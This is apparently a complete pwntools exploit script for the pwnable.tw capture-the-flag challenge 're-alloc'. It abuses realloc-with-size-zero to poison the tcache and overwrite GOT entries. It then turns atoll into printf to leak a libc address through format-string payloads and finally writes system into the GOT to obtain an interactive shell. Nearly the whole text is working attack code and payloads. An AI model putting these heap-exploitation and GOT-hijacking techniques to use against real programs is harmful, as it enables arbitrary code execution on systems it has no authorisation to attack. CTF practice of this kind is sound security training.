#!/usr/bin/python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=chall.pwnable.tw' '--port=10106' ./re-alloc
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./re-alloc')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10106)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

io = start()

def choice(option):
	io.sendlineafter(": ", str(option))

def alloc(idx, size, data):
	choice(1)
	io.sendlineafter(":", str(idx))
	io.sendlineafter(":", str(size))
	io.sendlineafter(":", data)

def realloc(idx, size, data):
	choice(2)
	io.sendlineafter(":", str(idx))
	io.sendlineafter(":", str(size))
	junk = io.recvn(5)
	if "alloc" not in junk:
		io.sendline(data)

def free(idx):
	choice(3)
	io.sendlineafter(":", str(idx))

libc = ELF("./libc.so.6")
alloc(1, 20, "AAAA")
realloc(1, 0, "BBBB")
realloc(1, 30, p64(0x404040)) #overwrote fd
free(0)

alloc(0, 70, "AAAA")
realloc(0, 0, "BBBB")
realloc(0, 80, p64(0x404040)) #overwrote fd
free(1)
alloc(1, 70, "XXXXXXXX")
free(0)

alloc(0, 20, p64(0x404040) + p64(exe.sym['printf']+6)) #overwrite
io.sendlineafter("Your choice: ", "1")
io.sendlineafter("Index:", "%0$c%9$n\xaf\x40\x40\x00\x00\x00\x00\x00\x00\x00")
io.sendlineafter("Size:", "%900c")

io.sendlineafter("Index:", "%3$p")

leak = int(io.recvn(14), 16)
libc.address = leak - (libc.sym["__read_chk"] + 9)

heap = 0x4040b0
heap2 = 0x4040b8
atoll_got = 0x404048
atoll_plt = 0x401096
alarm_got = 0x404040
realoc_got = 0x404058

log.info("Libc base : %s " % hex(libc.address))
log.info("Libc leak : %s " % hex(leak))
log.info("One Gadget : %s " % hex(libc.address + 0xe237f))
log.info("One Gadget : %s " % hex(libc.address + 0xe2383))
log.info("One Gadget : %s " % hex(libc.address + 0xe2386))
log.info("One Gadget : %s " % hex(libc.address + 0x106ef8))
log.info("Free hook  : %s " % hex(libc.sym['__free_hook']))
log.info("Malloc hook  : %s " % hex(libc.sym['__malloc_hook']))
log.info("GETS         : %s " % hex(libc.sym['gets']))
log.info("SYSTEM  : %s " % hex(libc.sym['system']))

io.sendlineafter("Index:", "%n")
io.sendlineafter("Size:", "%70c")
io.sendlineafter("Data", "X"*8 + p64(libc.sym['system']))

io.interactive()

